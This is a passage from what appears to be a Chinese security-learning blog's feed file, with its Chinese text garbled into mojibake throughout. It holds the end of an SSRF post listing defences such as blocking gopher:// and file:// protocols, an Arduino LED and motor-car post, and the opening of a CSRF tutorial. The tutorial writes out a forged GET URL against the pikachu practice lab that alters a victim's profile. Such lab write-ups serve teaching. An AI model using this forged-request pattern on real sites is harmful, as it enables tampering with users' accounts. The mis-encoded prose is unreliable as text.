çš„URLã€‚</p><ol><li>è¿‡æ»¤ã€‚è¿‡æ»¤è¿”å›çš„ä¿¡æ¯ï¼Œå¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</li><li>ç¦æ­¢è·³è½¬ã€‚é˜²æ­¢ç”¨æˆ·åˆ©ç”¨æœåŠ¡å™¨åšè·³æ¿æœº</li><li>ç¦æ­¢ä¸å¸¸ç”¨çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile:///,gopher://,ftp://ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</li><li>é™åˆ¶ç«¯å£ã€‚åªå¼€æ”¾å¸¸ç”¨ç«¯å£</li><li>ç»Ÿä¸€è¿”å›çš„é”™è¯¯ä¿¡æ¯ã€‚è¿™æ ·ç”¨æˆ·å°±ä¸å¯ä»¥æ ¹æ®è¿”å›ä¿¡æ¯åˆ¤æ–­ç«¯å£æƒ…å†µã€‚</li><li>ä½¿ç”¨DNSç¼“å­˜æŠ€æœ¯é˜²æ­¢DNSè§£ææ”»å‡»</li><li>ä½¿ç”¨æ­£åˆ™é˜²æ­¢ç•¸å½¢ç»•è¿‡</li></ol><h1 id="XSS-CSRF-SSRFå¼‚åŒ"><a href="#XSS-CSRF-SSRFå¼‚åŒ" class="headerlink" title="XSS,CSRF,SSRFå¼‚åŒ"></a>XSS,CSRF,SSRFå¼‚åŒ</h1><p>XSSï¼ŒCSRF,SSRFä¸‰ç§å¸¸è§çš„WebæœåŠ¡ç«¯æ¼æ´å‡æ˜¯ç”±äºï¼ŒæœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·æä¾›çš„å¯æ§æ•°æ®è¿‡äºä¿¡ä»»æˆ–è€…è¿‡æ»¤ä¸ä¸¥å¯¼è‡´çš„ã€‚</p><p>ä¸åŒç‚¹ï¼š</p><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>XSSæ˜¯æœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯æµè§ˆå™¨åœ¨æ¸²æŸ“æœåŠ¡å™¨è¿”å›çš„htmlé¡µé¢æ—¶ï¼Œå‡ºç°äº†é¢„æœŸå€¼ä¹‹å¤–çš„ è„šæœ¬è¯­å¥è¢«æ‰§è¡Œã€‚</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>CSRFæ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œéšæœºå€¼æ ¡éªŒï¼Œä¸”å¯¹httpè¯·æ±‚åŒ…å†…çš„referå­—æ®µæ ¡éªŒä¸ä¸¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ åˆ©ç”¨ç”¨æˆ·çš„Cookieä¿¡æ¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚å‘é€è‡³æœåŠ¡å™¨ã€‚</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>SSRFæ˜¯æœåŠ¡å™¨å¯¹ ç”¨æˆ·æä¾›çš„å¯æ§URLè¿‡äºä¿¡ä»»ï¼Œæ²¡æœ‰å¯¹æ”»å‡»è€…æä¾›çš„RULè¿›è¡Œåœ°å€é™åˆ¶å’Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»¥æ­¤ä¸ºè·³æ¿æ”»å‡»å†…ç½‘æˆ–å…¶ä»–æœåŠ¡å™¨ã€‚</p></div><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/91819069">SSRFæ¼æ´æ”»å‡»åŸç†åŠé˜²å¾¡æ–¹æ¡ˆ</a></p><p>[2] <a href="https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5">äº†è§£SSRF,è¿™ä¸€ç¯‡å°±è¶³å¤Ÿäº†</a></p><p>[3] <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247495875&idx=1&sn=5c25babaff728cc8498dced8f56a5bf1&chksm=ec1ca5fcdb6b2cea98cc125cee654d9d6426dabcc1ab8a6d466b7fc140ae8bfb59d63f473b9b&mpshare=1&scene=23&srcid=0401sfQC8XjENqPmXz5WNZZ8&sharer_sharetime=1617266425319&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">å¹²è´§ | SSRFæ¼æ´åˆ©ç”¨æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduinoè¯•ç©ä½“éªŒ</title>
      <link href="posts/5548.html"/>
      <url>posts/5548.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>å‰å‡ å¤©ï¼Œå¹¸è¿åœ°å¾—åˆ°äº†å­¦é•¿èµ é€çš„ä¸€ç»„ Arduino å¥—ä»¶ï¼Œå¥½å­¦ï¼ˆç©ï¼‰çš„æˆ‘è‡ªç„¶æ˜¯æ¿€åŠ¨ä¸‡åˆ†ã€‚äºæ˜¯å¼€å§‹äº† Arduinoå…¥å‘ä¹‹æ—…ã€‚ç°å°±åˆæ¬¡å­¦ä¹ ï¼ˆè¯•ç©ï¼‰å¤§ä½“æƒ…å†µä½œå¦‚ä¸‹è®°å½•ã€‚</p></div><h1 id="Ariuino-å¥—ä»¶"><a href="#Ariuino-å¥—ä»¶" class="headerlink" title="Ariuino å¥—ä»¶"></a>Ariuino å¥—ä»¶</h1><p>æ­¤å¥—ä»¶ä¸»è¦åŒ…å«æœ‰ Arduino UNOæ¿å­ã€é©±åŠ¨æ¨¡å—ï¼ˆL298Nï¼‰ã€å°è½¦å¥—ä»¶ã€æœé‚¦çº¿ã€é¢åŒ…æ¿ã€å„ç§ä¼ æ„Ÿå™¨ç­‰ç­‰ã€‚ï¼ˆç¬¬ä¸€æ¬¡æ¥è§¦è¿™äº›ï¼Œå·²ç»è¢«æˆ‘ç¿»å¾—æ··ä¹±ä¸å ªï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328162824003.png" alt="image-20210328162824003"></p><h1 id="ç‚¹ç¯ğŸ’¡"><a href="#ç‚¹ç¯ğŸ’¡" class="headerlink" title="ç‚¹ç¯ğŸ’¡"></a>ç‚¹ç¯ğŸ’¡</h1><p>ç»è¿‡ä¸€ç•ªå­¦ä¹ åï¼Œå¤§æ¦‚äº†è§£äº†è¿™äº›ä¸œè¥¿å„è‡ªçš„ä½œç”¨ã€‚é©¬ä¸Šå¼€å§‹äº†ç¬¬ä¸€ä¸ªï¼ˆæœ€ç®€å•çš„ï¼‰å°è¯•ï¼Œç‚¹äº® LED ç¯ï¼Œæ•ˆæœè¿˜å¯ä»¥ï¼Œç¯äº®äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328163509247.png" alt="image-20210328163509247"></p><p>å®ç°ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="built_in">pinMode</span>(<span class="number">13</span>, <span class="literal">OUTPUT</span>); <span class="comment">//å°†13å·å¼•è„šè®¾ç½®ä¸ºè¾“å‡ºçŠ¶æ€</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>); <span class="comment">//é«˜ç”µå¹³</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>); <span class="comment">//ä½ç”µå¹³</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æµæ°´ç¯âœ¨"><a href="#æµæ°´ç¯âœ¨" class="headerlink" title="æµæ°´ç¯âœ¨"></a>æµæ°´ç¯âœ¨</h1><p>ç¬¬äºŒä¸ªåšçš„æ˜¯æµæ°´ç¯ï¼Œå› ä¸ºåªæœ‰6ä¸ªLEDå°ç¯ï¼Œåšå¾—æ¯”è¾ƒç®€å•ï¼Œ6ä¸ªç¯åœ¨é¢åŒ…æ¿ä¸Šä¾æ¬¡äº®ç­ï¼Œä¹Ÿè¿˜å¯ä»¥ã€‚è¿˜å­¦ä¹ åˆ°äº†é¢åŒ…æ¿çš„ä½¿ç”¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/d_lamp.gif"></p><p>å®ç°ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">8</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">  <span class="built_in">pinMode</span>(i, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> interval = <span class="number">100</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ™ºèƒ½å°è½¦ğŸš—"><a href="#æ™ºèƒ½å°è½¦ğŸš—" class="headerlink" title="æ™ºèƒ½å°è½¦ğŸš—"></a>æ™ºèƒ½å°è½¦ğŸš—</h1><p>ä»¥å‰åšè¿‡çš„å°è½¦æ˜¯é©¬è¾¾åŠ ä¸Šè½®å­å°±èƒ½è·‘äº†ï¼Œä¸è¿‡åªèƒ½æ˜¯ä»¥æœ€å¤§é€Ÿåº¦ç›´è¡Œã€‚å¯æœ‰äº†unoæ¿åå°±å®Œå…¨ä¸ä¸€æ ·äº†ï¼Œå®ƒå¯æ˜¯æœ‰å¼ºå¤§çš„CPUåœ¨èº«ï¼Œèƒ½å®ç°è½¬å‘ã€å˜é€Ÿã€æ§åˆ¶ã€å¾ªè¿¹ç­‰ç­‰æ›´åŠ æ™ºèƒ½çš„æ“ä½œã€‚å› ä¸ºæ²¡æœ‰ç›¸åº”æ§åˆ¶æ¨¡å—ï¼Œè¿™æ¬¡çš„ç›®æ ‡æ˜¯è®©å°è½¦å‰åå·¦å³è·‘èµ·æ¥å°±è¡Œäº†ã€‚å¯æƒœæ²¡èƒ½æˆåŠŸï¼Œå¤ªå¤±è´¥äº†å§ã€‚ä»¥ä¸‹æ˜¯æœ€ç®€é™‹çš„å°è½¦ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328170432868.png" alt="image-20210328170432868"></p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="comment">//å®šä¹‰äº”ä¸­è¿åŠ¨çŠ¶æ€</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOP      0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FORWARD   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKWARD  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNLEFT  3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNRIGHT 4</span></span><br><span class="line"><span class="comment">//å®šä¹‰éœ€è¦ç”¨åˆ°çš„å¼•è„š</span></span><br><span class="line"><span class="keyword">int</span> leftMotor1 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> leftMotor2 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor1 = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor2 = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="comment">//è®¾ç½®æ§åˆ¶ç”µæœºçš„å¼•è„šä¸ºè¾“å‡ºçŠ¶æ€</span></span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="keyword">int</span> cmd;</span><br><span class="line">  <span class="keyword">for</span>(cmd=<span class="number">0</span>;cmd&lt;<span class="number">5</span>;cmd++)<span class="comment">//ä¾æ¬¡æ‰§è¡Œå‘å‰ã€å‘åã€å‘å·¦ã€æƒ³æœ‰ã€åœæ­¢å››ä¸ªè¿åŠ¨çŠ¶æ€</span></span><br><span class="line">  &#123;</span><br><span class="line">    motorRun(cmd);  </span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//æ¯ä¸ªå‘½ä»¤æ‰§è¡Œ2s </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿åŠ¨æ§åˆ¶å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">motorRun</span><span class="params">(<span class="keyword">int</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">    <span class="keyword">case</span> FORWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> BACKWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNLEFT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNRIGHT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>ç»è¿‡æˆ‘ç²—æµ…çš„åˆ†æï¼Œå°è½¦çš„ä»£ç å’Œè¿æ¥åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œé—®è¿‡å­¦é•¿åè®¤ä¸ºå¯èƒ½æ˜¯é‚£ä¸ªç”µæœºçš„é—®é¢˜ï¼ˆæ¯•ç«Ÿæ”¾äº†å‡ å¹´ï¼Œæ”¾åäº†ï¼Ÿï¼‰</p><p>ç­‰è¿‡å‡ å¤©ä¹°çš„æ–°å¥—ä»¶åˆ°äº†å†æˆ˜ï¼Œè¿™æ¬¡å°±è¿™ä¹ˆå‘Šä¸€æ®µè½äº†ã€‚è½¦è¿˜æ²¡åŠ¨èµ·æ¥ï¼Œå°±ç¿»è½¦äº†ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> Arduino </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFâ€œè‹é†’çš„å·¨äººâ€</title>
      <link href="posts/33839.html"/>
      <url>posts/33839.html</url>
      
        <content type="html"><![CDATA[<h1 id="å°åœºé¢"><a href="#å°åœºé¢" class="headerlink" title="å°åœºé¢"></a>å°åœºé¢</h1><ol><li>åœºæ™¯ä¸€ï¼šæˆ‘ç‚¹å‡»äº†ä¸€ä¸ªå¥½å‹è½¬å‘çš„qqç©ºé—´æ¶ˆæ¯ï¼Œæ€ä¹ˆè«åå…¶å¦™è‡ªå·±ä¹Ÿè½¬å‘äº†ï¼Ÿï¼Ÿï¼Ÿ</li><li>åœºæ™¯äºŒï¼šæˆ‘ç‚¹å‡»äº†ä¸€ä¸ªä¸å¯æè¿°çš„ç½‘é¡µï¼Œç„¶åè‡ªå·±çš„è´¦å·åšäº†ä¸€äº›ä¸å¯æè¿°çš„æ“ä½œï¼Ÿï¼Ÿï¼Ÿ</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lengjing.jpg"></p><h1 id="CSRFç®€ä»‹"><a href="#CSRFç®€ä»‹" class="headerlink" title="CSRFç®€ä»‹"></a>CSRFç®€ä»‹</h1><p>ä¸Šé¢ä¸¤ä¸ªåœºé¢å…¶å®å°±æ˜¯åˆ©ç”¨äº† CSRFï¼ˆCross Site Request Forgeryï¼‰ï¼Œå³è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚æ”»å‡»è€…åœ¨ç”¨æˆ·å·²ç»ç™»å½•ç›®æ ‡ç½‘ç«™ä¹‹åï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œåˆ©ç”¨ç›®æ ‡ç½‘ç«™å¯¹ç”¨æˆ·çš„ä¿¡ä»»ï¼Œä»¥ç”¨æˆ·èº«ä»½åœ¨æ”»å‡»é¡µé¢å¯¹ç›®æ ‡ç½‘ç«™å‘èµ·ä¼ªé€ ç”¨æˆ·æ“ä½œçš„è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚å¯ä»¥è¿™ä¹ˆç†è§£ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰è¿›è¡ŒæŸäº›ä¸å¯æè¿°çš„æ“ä½œã€‚</p><p>æƒ³è±¡ä¸€ä¸‹ï¼Œå®ƒå¯ä»¥ä»¥ä½ çš„åä¹‰å‘é‚®ä»¶ã€å‘æ¶ˆæ¯ã€è½¬è´¦ã€ä¿®æ”¹å¯†ç ã€åˆ é™¤æ–‡ç« /ç•™è¨€/è¯„è®ºâ€¦â€¦.å±å®å¯æ¶ï¼</p><p>CSRF ä¸ XSS ç›¸æ¯”ï¼Œè™½ç„¶ CSRF æ”»å‡»ä¸å¤ªæµè¡Œï¼Œä½†å´æ›´åŠ éš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸º CSRF æ¯” XSS æ›´å…·å±é™©æ€§ï¼ŒCSRF åœ¨ä¸šå†…å…·æœ‰â€œè‹é†’çš„å·¨äººâ€çš„ç§°å·ã€‚</p><h1 id="CSRFåŸç†"><a href="#CSRFåŸç†" class="headerlink" title="CSRFåŸç†"></a>CSRFåŸç†</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/20171009075751481.png"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·å®Œæˆä»¥ä¸‹ä¸¤ä¸ªæ“ä½œï¼Œå°±æœ‰å¯èƒ½é­å—CSRFæ”»å‡»ã€‚</p><ol><li>ç™»å½•ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</li><li>åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</li></ol><h1 id="CSRFæµ‹è¯•"><a href="#CSRFæµ‹è¯•" class="headerlink" title="CSRFæµ‹è¯•"></a>CSRFæµ‹è¯•</h1><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachuæ¼æ´ç»ƒä¹ å¹³å°</a>ä¹‹CSRF</p></blockquote><h2 id="GETæ–¹å¼"><a href="#GETæ–¹å¼" class="headerlink" title="GETæ–¹å¼"></a>GETæ–¹å¼</h2><p>â€‹    â‘  ç”¨æˆ·ç”²ç™»å½•ä¿¡ä»»ç½‘ç«™ï¼ŒæŸ¥çœ‹ä¸ªäººä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323205127914.png" alt="image-20210323205127914"></p><p>â€‹    â‘¡ æ”»å‡»è€…æ„é€ æ¶æ„çš„é“¾æ¥ï¼Œå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ç”²ã€‚</p><p>é€šè¿‡æŠ“åŒ…å¯è§ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯åæäº¤çš„è¯·æ±‚æ–¹æ³•æ˜¯GETã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323211923048.png" alt="image-20210323211923048"></p><p>URLé‡Œé¢çš„å››ä¸ªå‚æ•°éƒ½å¯ä»¥è¢«ä¿®æ”¹ï¼Œç›´æ¥æ„é€ URLä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.66&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;x&amp;phonenum&#x3D;000000&amp;add&#x3D;Mars&amp;email&#x3D;123@123.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure><p>â€‹    â‘¢ æ”»å‡»è€…é€šè¿‡ç¤¾å·¥ç­‰æ‰‹æ®µå¼•è¯±ç”¨æˆ·ç”²ç‚¹å‡»è¿™ä¸ªé“¾æ¥ã€‚å¦‚æœç”¨æˆ·ç”²æ­¤æ—¶ç™»å½•çŠ¶æ€æˆ–cookie/sessionæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ä»–çš„ä¿¡æ¯å°±è¢«ä¿®æ”¹äº†ã€‚</p><p><img 